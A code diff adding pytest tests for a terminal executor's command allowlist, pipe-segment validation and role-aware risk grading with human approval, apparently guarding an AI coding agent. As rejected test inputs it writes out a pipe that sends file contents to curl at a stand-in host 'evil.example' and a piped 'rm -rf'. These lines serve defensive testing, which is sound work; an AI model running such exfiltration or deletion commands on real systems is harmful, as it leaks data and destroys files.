@@ -2,6 +2,8 @@ from __future__ import annotations
 
 import pytest
 
+import terminal as terminal_module
+from command_policy import CommandAssessment, RiskLevel
 from terminal import TerminalError, TerminalExecutor
 
 
@@ -30,6 +32,105 @@ def test_terminal_validation_rejects_dangerous_inputs(tmp_path, command, error):
     executor = TerminalExecutor(tmp_path)
     with pytest.raises(TerminalError, match=error):
         executor._validate(command)
+
+
+# ── Pipe segment validation ─────────────────────────────────────────
+
+def test_pipe_segments_each_validated_against_allowlist(tmp_path):
+    """`allowed | forbidden` must not smuggle binaries past the allowlist."""
+    executor = TerminalExecutor(tmp_path)
+    with pytest.raises(TerminalError, match="not allowed"):
+        executor._validate(["cat", "file.txt", "|", "curl", "evil.example"])
+    with pytest.raises(TerminalError, match="forbidden"):
+        executor._validate(["echo", "x", "|", "rm", "-rf", "dir"])
+    with pytest.raises(TerminalError, match="not allowed"):
+        executor._validate(["echo", "x", "|", "unknown-tool"])
+    with pytest.raises(TerminalError, match="Subcommand"):
+        executor._validate(["cat", "file.txt", "|", "git", "reset"])
+
+
+def test_pipe_with_allowed_segments_passes_validation(tmp_path):
+    executor = TerminalExecutor(tmp_path)
+    executor._validate(["cat", "file.txt", "|", "grep", "needle"])
+
+
+def test_pipe_empty_segment_rejected(tmp_path):
+    executor = TerminalExecutor(tmp_path)
+    with pytest.raises(TerminalError, match="Empty command segment"):
+        executor._validate(["|", "grep", "x"])
+    with pytest.raises(TerminalError, match="Empty command segment"):
+        executor._validate(["cat", "file.txt", "|"])
+
+
+# ── command_policy risk assessment in the run() path ────────────────
+
+def test_run_uses_command_policy_and_denies_on_refusal(tmp_path, monkeypatch):
+    """assess_command participates in run(); denied approval → denied result."""
+    executor = TerminalExecutor(tmp_path)
+    assessed: dict = {}
+
+    def fake_assess(command, role="coder"):
+        assessed["command"] = command
+        assessed["role"] = role
+        return CommandAssessment(
+            command=command,
+            risk=RiskLevel.DANGEROUS,
+            reason="test-dangerous",
+            requires_approval=True,
+        )
+
+    approvals: list = []
+
+    def fake_approval(cls_command, reason):
+        approvals.append((cls_command, reason))
+        return False
+
+    monkeypatch.setattr(terminal_module, "assess_command", fake_assess)
+    monkeypatch.setattr(
+        TerminalExecutor, "_request_user_approval", classmethod(lambda cls, c, r: fake_approval(c, r))
+    )
+
+    result = executor.run(["ls"], role="devops")
+
+    assert assessed["command"] == ["ls"]
+    assert assessed["role"] == "devops"
+    assert approvals and "test-dangerous" in approvals[0][1]
+    assert result.denied is True
+    assert result.returncode == -1
+
+
+def test_run_executes_safe_command_without_approval(tmp_path, monkeypatch):
+    executor = TerminalExecutor(tmp_path)
+
+    def forbid_approval(cls, command, reason):
+        raise AssertionError("safe command must not trigger HITL approval")
+
+    monkeypatch.setattr(TerminalExecutor, "_request_user_approval", classmethod(forbid_approval))
+    result = executor.run(["echo", "hello"])
+
+    assert result.returncode == 0
+    assert "hello" in result.stdout
+
+
+def test_assess_risk_is_role_aware_for_allowlisted_commands(tmp_path):
+    """docker rm is allowlisted (docker: None) but risk-graded by role."""
+    executor = TerminalExecutor(tmp_path)
+    executor._validate(["docker", "rm", "container"])  # passes allowlist
+
+    coder = executor._assess_risk(["docker", "rm", "container"], "coder")
+    devops = executor._assess_risk(["docker", "rm", "container"], "devops")
+
+    assert coder.requires_approval is True
+    assert devops.requires_approval is False
+
+
+def test_assess_risk_checks_every_pipe_segment(tmp_path):
+    """`safe | dangerous` must be graded by the riskiest segment."""
+    executor = TerminalExecutor(tmp_path)
+    assessment = executor._assess_risk(["echo", "x", "|", "rm", "-rf", "dir"], "coder")
+
+    assert assessment.risk is RiskLevel.DANGEROUS
+    assert assessment.requires_approval is True
 
 
 def test_terminal_restricted_profile_blocks_dev_tools(tmp_path):
